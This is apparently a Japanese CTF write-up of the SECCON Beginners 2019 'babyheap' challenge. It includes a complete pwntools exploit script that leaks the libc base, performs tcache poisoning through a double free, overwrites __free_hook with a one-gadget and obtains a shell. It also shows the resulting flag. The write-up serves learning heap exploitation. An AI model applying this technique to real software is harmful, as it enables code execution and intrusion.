# はじめに
2019年5月25日〜26日、Szarnyさんと一緒SECCONのCTF For Beginners (ctf4b)に参加し、最後に二人のチームが2707ポイントを集め、666チームが参加する中26位で終わりました。

CTFをやったときに解けませんでしたが、勉強になりましたので、今回、「babyheap」という問題の解法を紹介していきます。
# babyheap
「babyheap」という名前のELFバイナリと「libc-2.27.so」が手に入れます。
```
$ checksec babyheap
[*] '/ctf/SECCON2019-ctf4b/Pwnable/BabyHeap/babyheap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
$
```
やんや〜PIEにFull RELROも有効。とりあえずプログラムを実行してみましょう。
```
$ LD_PRELOAD=./libc-2.27.so ./babyheap 
Welcome to babyheap challenge!
Present for you!!
>>>>> 0x7f8aff64ca00 <<<<<

MENU
1. Alloc
2. Delete
3. Wipe
4. Exit
> 
```
Heap系問題のようですね。`radare2`で解析すると、教えてくれてるプレゼントがlibcの`_IO_2_1_stdin_`だとわかります。助かりましたね！これで自分でリークするのが不要。
```
|           0x000009b5      488b05741620.  mov rax, qword [obj.stdin]
|           0x000009bc      4889c6         mov rsi, rax
|           0x000009bf      488d3df20100.  lea rdi, str.Welcome_to_babyheap_challenge___Present_for_you___________p
```
要するに、今まで知ってることは以下の３つ：
- これがHeap系の問題
- 何もしなくてlibcのアドレスを既に把握しています
- libcのバージョンが2.27だから、tcacheが使えます

さてexploitスクリプトのベースを作りましょう。とりあえずラッパー関数を作成していきます。
```
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

libc = ELF("./libc-2.27.so")
p = process(["./babyheap"], env={"LD_PRELOAD" : libc.path})

# 1 = malloc(0x30)
# 2 = ヌル化せずにfree
# 3 = ヌル化(だがfreeはしない)
# 0 = プログラム終了
def alloc(data):
        p.sendlineafter("> ", "3") # allocする前にポインタのヌル化が必要。
        p.sendlineafter("> ", "1")
        p.sendlineafter(":", str(data))

def free():
        p.sendlineafter("> ", "2")

# プレゼントを読み込み、libcの先頭アドレスを計算する。
p.readuntil(">>>>> ")
leak_stdin = int(p.read(14), 16)
libc_base = leak_stdin - libc.symbols["_IO_2_1_stdin_"]
print("[*] libcのアドレス：%s" % hex(libc_base))
```
このプログラムをエクスプロイトして、one-gadgetでシェルを奪うことを目的としましょう。

「[tcache poisoning](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_poisoning.c)」という攻撃を行えば、任意書き込みが出来、`__free_hook`をone-gadgetのアドレスに書き換えれば、また`free()`するとジャンプしてくれるはずです。
```
addr___free_hook = libc_base + libc.symbols["__free_hook"]
addr_one_gadget = libc_base + 0x4f322

# 二度解放（Double Free）攻撃を行う
alloc("")                       # α領域
free()                          # tcache: [α領域, 0x00]
free()                          # tcache: [α領域, α領域, 0x00]

alloc(p64(addr___free_hook))    # tcache: [α領域, __free_hook, ???]
alloc("")                       # tcache: [__free_hook, ???]

# 次は__free_hookの位置が返ってきます
alloc(p64(addr_one_gadget))     # tcache: [???]

free()
p.interactive()
p.close()
```
```
$ ./exploit.py 
[*] '/ctf/SECCON2019-ctf4b/Pwnable/BabyHeap/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './babyheap': pid 9530
[*] libcのアドレス：0x7fcad323d000
[*] Switching to interactive mode
$ cat flag.txt
ctf4b{h07b3d_0f_51mpl3_h34p_3xpl017}
$  
```

以上 babyheap の解法でした。最後まで読んで頂き、ありがとうございました！
